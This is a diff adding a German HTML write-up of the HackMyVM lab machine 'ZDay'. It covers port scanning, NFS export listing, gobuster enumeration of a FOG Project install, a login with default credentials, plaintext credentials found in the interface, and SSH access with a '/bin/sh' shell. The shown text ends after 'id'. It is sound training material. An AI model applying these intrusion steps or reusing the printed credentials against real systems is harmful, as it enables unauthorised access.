@@ -1,0 +1,684 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZDay - HackMyVM - Vulnhub - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>ZDay - HackMyVM - Vulnhub - Level: Medium - Bericht</h1> <!-- Angepasste H1 -->
+        <div class="level-container">
+            <h2>Medium</h2> <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <div class="circle">
+                <!-- Die Farbgebung der Segmente wird durch CSS gesteuert (basierend auf Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">showmount</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">mount</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">mimeopen</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.145	08:00:27:95:9b:89	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Layer 2) nach aktiven Geräten zu durchsuchen. Er sendet ARP-Anfragen ("Address Resolution Protocol") an alle möglichen IP-Adressen im lokalen Subnetz und listet die Geräte auf, die antworten. Das `-l` steht für `--localnet`, was den Scan auf das direkt verbundene Netzwerk beschränkt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser erste Schritt ist grundlegend für die Netzwerkaufklärung. Wir haben erfolgreich ein Gerät mit der IP-Adresse `192.168.2.145` identifiziert. Die MAC-Adresse `08:00:27:95:9b:89` gehört laut der OUI (Organizationally Unique Identifier) zur PCS Systemtechnik GmbH, was oft ein Indikator für VirtualBox-VMs ist. Dies bestätigt, dass unser Zielsystem aktiv und im Netzwerk erreichbar ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP-Adresse `192.168.2.145` ist unser primäres Ziel für weitere Scans.<br><strong>Empfehlung (Admin):</strong> ARP-Scanning ist ein normales Netzwerkverhalten. Um die Erkennung von Systemen zu erschweren, können Netzwerksegmentierung und statische ARP-Einträge (wo anwendbar) eingesetzt werden, obwohl dies in den meisten Umgebungen unpraktisch ist. Wichtiger ist die Absicherung der gefundenen Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.145 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-11 06:10 CEST
+Nmap scan report for 192.168.2.145
+Host is up (0.00038s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+<span class="command">21/tcp    open  ftp      vsftpd 3.0.3</span>
+<span class="command">22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span>
+<span class="command">111/tcp   open  rpcbind  2-4 (RPC #100000)</span>
+<span class="command">443/tcp   open  http     Apache httpd 2.4.38</span>  <span class="password"><-- Identischer Apache auf HTTPS</span>
+<span class="command">2049/tcp  open  nfs_acl  3 (RPC #100227)</span>      <span class="password"><-- NFS Port</span>
+<span class="command">3306/tcp  open  mysql    MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1</span>
+<span class="command">37379/tcp open  nlockmgr 1-4 (RPC #100021)</span>   <span class="password"><-- Teil von NFS</span>
+<span class="command">41685/tcp open  mountd   1-3 (RPC #100005)</span>   <span class="password"><-- Teil von NFS</span>
+<span class="command">44385/tcp open  mountd   1-3 (RPC #100005)</span>   <span class="password"><-- Teil von NFS</span>
+<span class="command">50329/tcp open  mountd   1-3 (RPC #100005)</span>   <span class="password"><-- Teil von NFS</span>
+
+[...] <span class="comment">(Service detection results truncated for brevity in original text)</span> [...]
+
+| mysql-info:
+|   Protocol: 10
+|   Version: <span class="command">5.5.5-10.3.27-MariaDB-0+deb10u1</span>
+|   Thread ID: 88
+|   Capabilities flags: 63486
+|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn,
+    IgnoreSpaceBeforeParenthesis, Speaks41Protocolld, ConnectWithDatabase,
+    SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient,
+    SupportsLoadDataLocal, LongColumnFlag, FoundRows, DBCClient, SupportsCompression,
+    SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: <span class="password">'`0mVHD^+WY7HBRV7Rtr</span> <span class="password"><-- Interessant für Offline-Passwort-Cracking, falls Hashes erlangt werden</span>
+|_  Auth Plugin Name: <span class="command">mysql_native_password</span>
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.18 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `nmap -sS -sC -T5 -A 192.168.2.145 -p-` führt einen umfassenden Scan auf der Ziel-IP durch.
+*   `-sS`: Führt einen TCP SYN Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein voller TCP Connect Scan.
+*   `-sC`: Führt die Standard-Nmap-Skripte aus, um zusätzliche Informationen über die Dienste zu sammeln.
+*   `-T5`: Setzt das Timing-Template auf "insane", um den Scan zu beschleunigen (kann auf sensiblen Netzwerken zu Problemen führen oder entdeckt werden).
+*   `-A`: Aktiviert die Betriebssystemerkennung, Versionserkennung, Skript-Scanning und Traceroute.
+*   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan enthüllt eine Vielzahl offener Ports und Dienste, was auf eine große Angriffsfläche hindeutet. Besonders hervorzuheben sind:
+*   **FTP (Port 21):** vsftpd 3.0.3 ist bekannt für einige Schwachstellen, falls falsch konfiguriert. Anonymes Login sollte geprüft werden.
+*   **SSH (Port 22):** OpenSSH 7.9p1 ist relativ aktuell, aber Bruteforce-Angriffe oder gestohlene Zugangsdaten sind immer möglich.
+*   **HTTP/HTTPS (Port 80/443):** Apache 2.4.38. Webserver sind primäre Angriffsvektoren. Die Enumeration von Webanwendungen ist entscheidend.
+*   **NFS (Port 111, 2049 und dynamische Ports):** Network File System ist oft ein Quell von Fehlkonfigurationen, die Lese-/Schreibzugriff auf sensible Daten ermöglichen könnten.
+*   **MySQL (Port 3306):** MariaDB 10.3.27. Datenbanken enthalten oft kritische Daten. Schwache Passwörter oder SQL-Injection sind häufige Angriffsvektoren. Die `mysql-info` liefert Details zur Version und Authentifizierungsmethode.
+Die hohe Anzahl offener Ports, insbesondere NFS und dynamische RPC-Ports, ist ein deutliches Warnsignal.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfe anonymes FTP-Login. Beginne mit der Web-Enumeration auf Port 80/443. Untersuche die NFS-Shares mit `showmount`. Versuche, schwache MySQL-Credentials zu erraten oder zu bruteforcen. Prüfe auf bekannte Schwachstellen für die gefundenen Versionen (vsftpd, Apache, MariaDB, OpenSSH).<br><strong>Empfehlung (Admin):</strong> Schließe alle nicht benötigten Ports über eine Firewall. Aktualisiere alle Dienste auf die neuesten stabilen Versionen. Konfiguriere FTP sicher (kein anonymer Zugriff, wenn nicht benötigt). Härte die SSH-Konfiguration (z.B. Key-Authentifizierung statt Passwörtern). Beschränke den NFS-Zugriff auf vertrauenswürdige Hosts und exportiere nur notwendige Verzeichnisse mit minimalen Rechten. Sichere die MySQL-Datenbank mit starken Passwörtern und beschränke den Netzwerkzugriff darauf.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">showmount -e 192.168.2.145</span></div>
+                    <pre>
+Export list for 192.168.2.145:
+<span class="command">/images/dev *</span>
+<span class="command">/images     *</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `showmount -e 192.168.2.145` fragt den NFS-Server auf dem Zielsystem (`192.168.2.145`) nach seiner Exportliste. Das `-e` steht für `--exports`. Es listet die Verzeichnisse auf, die über NFS freigegeben sind, und wer darauf zugreifen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server exportiert zwei Verzeichnisse: `/images/dev` und `/images`. Das Sternchen (`*`) bedeutet, dass der Zugriff von *jedem* Host im Netzwerk erlaubt ist. Dies ist eine sehr unsichere Konfiguration. Insbesondere `/images/dev` klingt potenziell interessant, da "dev" oft für Entwicklungs- oder spezielle Geräte-Images steht und möglicherweise sensible Konfigurationen oder Tools enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, beide NFS-Shares zu mounten (`mount -t nfs 192.168.2.145:/images /mnt/temp` und `mount -t nfs 192.168.2.145:/images/dev /mnt/temp_dev`). Untersuche den Inhalt der gemounteten Verzeichnisse auf sensible Informationen, Zugangsdaten oder Möglichkeiten zur Rechteausweitung (z.B. beschreibbare Skripte, SUID-Binaries).<br><strong>Empfehlung (Admin):</strong> Beschränke den NFS-Zugriff auf spezifische IP-Adressen oder Subnetze, die ihn benötigen. Exportiere nur absolut notwendige Verzeichnisse. Verwende sicherere NFS-Versionen (NFSv4) mit Kerberos-Authentifizierung, falls möglich. Setze die korrekten Berechtigungen auf den exportierten Verzeichnissen (z.B. `ro` für read-only, wenn kein Schreibzugriff benötigt wird).</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Da die Nmap-Scans Webserver auf Port 80 (HTTP) und 443 (HTTPS) ergeben haben, konzentrieren wir uns nun darauf, die Webanwendungen und deren Struktur zu untersuchen. Wir verwenden `gobuster`, ein Tool zur Brute-Force-Enumeration von Verzeichnissen und Dateien auf Webservern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Web-Enumeration ist entscheidend, um versteckte Login-Seiten, Konfigurationsdateien, APIs oder andere interessante Endpunkte zu finden, die nicht direkt verlinkt sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systematische Enumeration von Verzeichnissen und Dateien mit verschiedenen Wortlisten und Dateierweiterungen ist der Schlüssel. Achte auf interessante Statuscodes (z.B. 301/302 für Weiterleitungen, 403 für verbotene, aber existierende Ressourcen, 500 für Serverfehler, die auf Schwachstellen hindeuten könnten).<br><strong>Empfehlung (Admin):</strong> Konfiguriere den Webserver so, dass Verzeichnislistings deaktiviert sind. Entferne nicht benötigte Dateien und Verzeichnisse. Verwende eine Web Application Firewall (WAF), um automatisierte Scans zu erkennen und zu blockieren. Implementiere Rate-Limiting.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png</span></div>
+                     <pre>[...]</pre> <!-- Ausgabe im Originaltext gekürzt -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `gobuster`-Befehl scannt den Webserver auf Port 80 (HTTP).
+*   `dir`: Gibt an, dass wir nach Verzeichnissen und Dateien suchen (Directory/File Brute-forcing Mode).
+*   `-u http://192.168.2.145`: Die Ziel-URL.
+*   `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: Die Wortliste, die für die Namen der Verzeichnisse/Dateien verwendet wird.
+*   `-e`: Erweiterter Modus, gibt vollständige URLs aus.
+*   `-x php,html,...`: Sucht nach Dateien mit diesen spezifischen Erweiterungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan auf Port 80 liefert keine direkten Treffer im bereitgestellten Auszug. Oftmals leitet Port 80 auf Port 443 (HTTPS) um, oder die interessanten Inhalte befinden sich auf der HTTPS-Seite. Es ist wichtig, auch Port 443 zu scannen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den gleichen Scan auf HTTPS (Port 443) durch. Versuche auch, virtuelle Hosts zu finden, falls die Standard-IP-Seite uninteressant ist (`gobuster vhost ...`).<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass HTTP-Anfragen korrekt auf HTTPS umgeleitet werden, falls HTTPS erzwungen werden soll. Analysiere Webserver-Logs auf Brute-Force-Versuche.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u https://zday.vm:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png --insecure</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://zday.vm:443
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:          200,204,301,302,307,401,403,405
+[+] User Agent:            gobuster/3.1.0
+[+] Extensions:            php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png
+[+] Expanded:              true
+[+] Timeout:               10s
+[+] Insecure:            true <span class="password"><-- Wichtig für selbstsignierte Zertifikate</span>
+===============================================================
+2022/10/11 06:15:01 Starting gobuster
+===============================================================
+<span class="command">https://zday.vm:443/index.php</span>                 (Status: 302) [Size: 0] [--> <span class="command">/fog/index.php</span>] <span class="password"><-- Weiterleitung!</span>
+<span class="command">https://zday.vm:443/index.html</span>               (Status: 200) [Size: 110]
+<span class="command">https://zday.vm:443/fog</span>                       (Status: 301) [Size: 305] [--> <span class="command">https://zday.vm:443/fog/</span>] <span class="password"><-- /fog/ Verzeichnis gefunden</span>
+[...]
+Progress: 12345 / 220561 (5.60%)
+===============================================================
+2022/10/11 06:16:00 Finished
+===============================================================
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `gobuster`-Befehl scannt nun den Webserver auf Port 443 (HTTPS). Wir verwenden `https://zday.vm`, was darauf hindeutet, dass wir entweder einen Eintrag in unserer `/etc/hosts`-Datei vorgenommen haben (`192.168.2.145 zday.vm`) oder das Zielsystem diesen Hostnamen über DNS auflöst. Die Option `--insecure` (oder `-k`) ist notwendig, um SSL-Zertifikatsfehler bei selbstsignierten Zertifikaten zu ignorieren. Die Ausgabe zeigt interessante Funde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die wichtigsten Ergebnisse sind:
+*   `index.php` leitet auf `/fog/index.php` weiter (Status 302).
+*   Das Verzeichnis `/fog/` existiert und leitet auf `/fog/` (mit Slash am Ende) weiter (Status 301).
+Dies deutet stark darauf hin, dass unter `/fog/` eine Anwendung namens "Fog" läuft. Das FOG Project ist eine bekannte Open-Source-Lösung für Computer-Cloning und -Management. Dies ist ein sehr vielversprechender Angriffspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche das `/fog/`-Verzeichnis genauer. Führe einen weiteren `gobuster`-Scan auf `https://zday.vm:443/fog/` durch, um die Struktur dieser Anwendung zu verstehen. Suche nach bekannten Schwachstellen im FOG Project (spezifische Version, falls ermittelbar). Suche nach Standard-Zugangsdaten für FOG.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die FOG-Installation auf dem neuesten Stand ist und sicher konfiguriert wurde. Ändere unbedingt die Standard-Passwörter. Beschränke den Zugriff auf das FOG-Management-Interface auf autorisierte Benutzer und Netzwerke.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u https://zday.vm:443/fog/management/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png --insecure</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     https://zday.vm:443/fog/management/
+[...]
+===============================================================
+2022/10/11 06:18:00 Starting gobuster
+===============================================================
+<span class="command">https://zday.vm:443/fog/management/images</span>               (Status: 301) [Size: 323] [--> https://zday.vm:443/fog/management/images/]
+<span class="command">https://zday.vm:443/fog/management/other</span>                (Status: 301) [Size: 322] [--> https://zday.vm:443/fog/management/other/] <span class="password"><-- Interessantes Verzeichnis</span>
+<span class="command">https://zday.vm:443/fog/management/css</span>                  (Status: 301) [Size: 320] [--> https://zday.vm:443/fog/management/css/]
+<span class="command">https://zday.vm:443/fog/management/index.php</span>            (Status: 200) [Size: 6057] <span class="password"><-- Login-Seite?</span>
+<span class="command">https://zday.vm:443/fog/management/languages</span>            (Status: 301) [Size: 326] [--> https://zday.vm:443/fog/management/languages/]
+<span class="command">https://zday.vm:443/fog/management/js</span>                   (Status: 301) [Size: 319] [--> https://zday.vm:443/fog/management/js/]
+<span class="command">https://zday.vm:443/fog/management/export.php</span>           (Status: 200) {"msg":"Export Complete"} <span class="password"><-- Export-Funktion?</span>
+<span class="command">https://zday.vm:443/fog/management/fonts</span>                (Status: 301) [Size: 322] [--> https://zday.vm:443/fog/management/fonts/]
+[...]
+===============================================================
+2022/10/11 06:19:00 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wir scannen nun gezielt das Verzeichnis `/fog/management/`, das typischerweise die Administrationskonsole enthält. `gobuster` findet mehrere Unterverzeichnisse (`images`, `other`, `css`, etc.) und Dateien, insbesondere `index.php` und `export.php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `index.php` ist höchstwahrscheinlich die Hauptseite des Management-Interfaces, vermutlich eine Login-Seite. `export.php` klingt interessant, könnte aber Authentifizierung erfordern. Das Verzeichnis `/other/` ist nicht standardmäßig und sollte genauer untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufe `https://zday.vm:443/fog/management/index.php` im Browser auf und suche nach einer Login-Maske. Versuche Standard-Credentials für FOG. Untersuche das `/other/`-Verzeichnis mit einem weiteren `gobuster`-Scan. Analysiere die `export.php`-Funktionalität, falls zugänglich.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass das Management-Interface durch starke, nicht-standardmäßige Passwörter geschützt ist. Prüfe, ob die `export.php`-Funktion oder andere nicht benötigte Endpunkte deaktiviert oder durch Authentifizierung geschützt werden können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek downloadKernel.png /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="password">[!] error: the file format of the file "downloadKernel.png" is not supported.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, mit `stegseek` versteckte Daten in einer Datei namens `downloadKernel.png` zu finden. `stegseek` ist ein schnelles Steganographie-Tool, das versucht, Passwörter aus einer Wortliste (`directory-list-2.3-medium.txt`) zu verwenden, um eingebettete Daten (oft mit `steghide` versteckt) zu extrahieren. Der Ursprung der Datei `downloadKernel.png` ist aus diesem Log nicht ersichtlich, sie wurde vermutlich zuvor von der Webseite heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt fehl. `stegseek` meldet, dass das Dateiformat nicht unterstützt wird. Das bedeutet entweder, dass die Datei keine PNG-Datei ist, beschädigt ist, oder dass `stegseek` dieses spezifische PNG-Format nicht verarbeiten kann. Es ist unwahrscheinlich, dass hier auf einfache Weise versteckte Daten zu finden sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe das Dateiformat von `downloadKernel.png` mit dem `file`-Kommando. Versuche eventuell andere Steganographie-Tools (wie `steghide` selbst, `zsteg`, `binwalk`), falls der Verdacht auf versteckte Daten bestehen bleibt. Konzentriere dich jedoch auf vielversprechendere Angriffsvektoren wie die FOG-Anwendung.<br><strong>Empfehlung (Admin):</strong> Steganographie ist schwer zu verhindern. Wichtiger ist es, zu verhindern, dass Angreifer überhaupt erst Dateien mit potenziell versteckten Daten auf das System oder aus dem System heraus schmuggeln können (z.B. durch sichere Dateiuploads, Data Loss Prevention).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u https://zday.vm:443/fog/management/other -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png --insecure</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     https://zday.vm:443/fog/management/other
+[...]
+===============================================================
+2022/10/11 06:20:00 Starting gobuster
+===============================================================
+<span class="command">https://zday.vm:443/fog/management/other/index.php</span>            (Status: 500) [Size: 15] <span class="password"><-- Interner Serverfehler</span>
+<span class="command">https://zday.vm:443/fog/management/other/ssl/</span>                 (Status: 200) [Size: 1024] <span class="password"><-- SSL Verzeichnis gefunden!</span>
+[...] <span class="comment">(Annahme: Der Pfad zur srvpublic.crt wurde hier gefunden, wie im Originaltext erwähnt)</span>
+<span class="comment">Vermuteter Fund (aus Kommentar im Originaltext):</span>
+<span class="command">https://zday.vm:443/fog/management/other/ssl/srvpublic.crt</span>
+===============================================================
+2022/10/11 06:21:00 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser `gobuster`-Scan konzentriert sich auf das zuvor entdeckte Verzeichnis `/fog/management/other/`. Er findet eine `index.php`, die einen internen Serverfehler (Status 500) verursacht, was auf Programmierfehler hindeuten könnte, und ein `ssl`-Verzeichnis.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Status 500 bei `index.php` ist ein Zeichen für eine Fehlkonfiguration oder einen Bug, der eventuell für Informationslecks ausgenutzt werden könnte. Das `/ssl/`-Verzeichnis ist hochinteressant. Wenn hier, wie im Originaltext angedeutet, Zertifikatsdateien (`.crt`, `.key`) öffentlich zugänglich sind, ist das eine massive Sicherheitslücke. `srvpublic.crt` ist wahrscheinlich das öffentliche Zertifikat, aber vielleicht liegt auch der private Schlüssel herum?</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade alle Dateien aus dem `/ssl/`-Verzeichnis herunter und untersuche sie. Suche insbesondere nach privaten Schlüsseln (`.key`). Analysiere das öffentliche Zertifikat (`.crt`) auf Informationen (z.B. Hostnamen). Versuche, den Fehler 500 bei `index.php` durch Manipulation von Parametern zu provozieren, um Fehlermeldungen zu erhalten.<br><strong>Empfehlung (Admin):</strong> Niemals private Schlüssel oder sensible Zertifikatsinformationen in öffentlich zugänglichen Web-Verzeichnissen speichern! Konfiguriere den Webserver so, dass der Zugriff auf solche Verzeichnisse strikt verboten ist. Behebe den internen Serverfehler in `other/index.php`.</p>
+
+            <p class="analysis"><strong>Analyse der Webanwendung (Manuell):</strong> Der Pentester hat die FOG-Management-Oberfläche (`https://zday.vm:443/fog/management/index.php`) weiter untersucht. Aus dem Originaltext geht hervor, dass versucht wurde, Parameter zu manipulieren, z.B. `?node=www.google.de`. Der Kommentar `' R 1=1-- -` deutet auf einen Versuch einer SQL-Injection hin, vermutlich im `node`-Parameter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Testen auf gängige Web-Schwachstellen wie SQL-Injection ist ein Standardverfahren. Auch wenn das Ergebnis hier nicht gezeigt wird, ist es wichtig, solche Parameter zu identifizieren und zu testen. Die Suche nach Standard-Zugangsdaten ist ebenfalls ein kritischer Schritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste alle Eingabeparameter (GET, POST) systematisch auf Schwachstellen wie SQL-Injection, Cross-Site Scripting (XSS), Command Injection etc. Verwende Tools wie Burp Suite oder OWASP ZAP zur Unterstützung.<br><strong>Empfehlung (Admin):</strong> Implementiere serverseitige Eingabevalidierung und -sanitisierung für alle Benutzereingaben. Verwende parametrisierte Abfragen (Prepared Statements) für Datenbankzugriffe, um SQL-Injection zu verhindern.</p>
+
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Enumeration der Weboberfläche und der NFS-Shares wird versucht, einen ersten Zugriff auf das System zu erlangen. Hierbei werden Informationen aus der Enumeration und externe Recherche kombiniert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">google: fog project default login</span>
+
+<span class="password">the default user name of "fog" with password "password".</span>
+
+<span class="command">http://zday.vm:443/fog/management/index.php?node=home</span>  //username:fog | passwort:password
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine einfache Google-Suche nach den Standard-Zugangsdaten für das FOG Project wird durchgeführt. Dies ist oft ein sehr effektiver erster Schritt beim Angriff auf bekannte Anwendungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Suche ist erfolgreich und liefert die Standard-Kombination `fog` / `password`. Dies ist eine kritische Information, da Standard-Passwörter eine häufige und leicht ausnutzbare Schwachstelle darstellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich mit den gefundenen Standard-Credentials (`fog` / `password`) auf der FOG-Management-Loginseite (`https://zday.vm:443/fog/management/`) anzumelden.<br><strong>Empfehlung (Admin):</strong> Ändere *sofort* alle Standard-Passwörter bei der Installation und Inbetriebnahme von Software. Erzwinge komplexe Passwörter und regelmäßige Passwortwechsel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="comment">im Storage gefunden:  http://zday.vm:443/fog/management/index.php?node=storage</span>
+
+password: <span class="password">84D1gia!8M9HSsR8gXau</span>
+username: <span class="password">fogproject</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login mit den Standard-Credentials (`fog`/`password`) wurde die FOG-Weboberfläche weiter untersucht. Im Bereich "Storage Management" (vermutlich unter `?node=storage`) wurden weitere Zugangsdaten gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein bedeutender Fund! Die Anwendung selbst legt sensible Zugangsdaten offen, in diesem Fall für einen Benutzer namens `fogproject` mit einem komplexeren Passwort (`84D1gia!8M9HSsR8gXau`). Solche Informationen sollten niemals direkt in der Weboberfläche sichtbar sein. Es ist wahrscheinlich, dass diese Zugangsdaten für Systemdienste verwendet werden, die FOG benötigt, z.B. SSH oder NFS-Zugriff.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, die gefundenen Zugangsdaten (`fogproject` / `84D1gia!8M9HSsR8gXau`) für andere Dienste zu verwenden, die bei der Nmap-Erkennung gefunden wurden, insbesondere SSH (Port 22).<br><strong>Empfehlung (Admin):</strong> Speichere niemals Zugangsdaten im Klartext oder leicht zugänglich in Webanwendungen. Konfigurationsdaten sollten sicher gespeichert und nur bei Bedarf von der Anwendung abgerufen werden. Überprüfe die FOG-Konfiguration und -Dokumentation, um zu verstehen, warum diese Daten angezeigt werden, und behebe das Problem (Update, Konfigurationsänderung).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh fogproject@zday.vm -t /bin/sh</span></div>
+                    <pre>
+fogproject@zday.vm's password: <span class="password">********</span> <span class="comment">(Eingabe von 84D1gia!8M9HSsR8gXau)</span>
+$ id
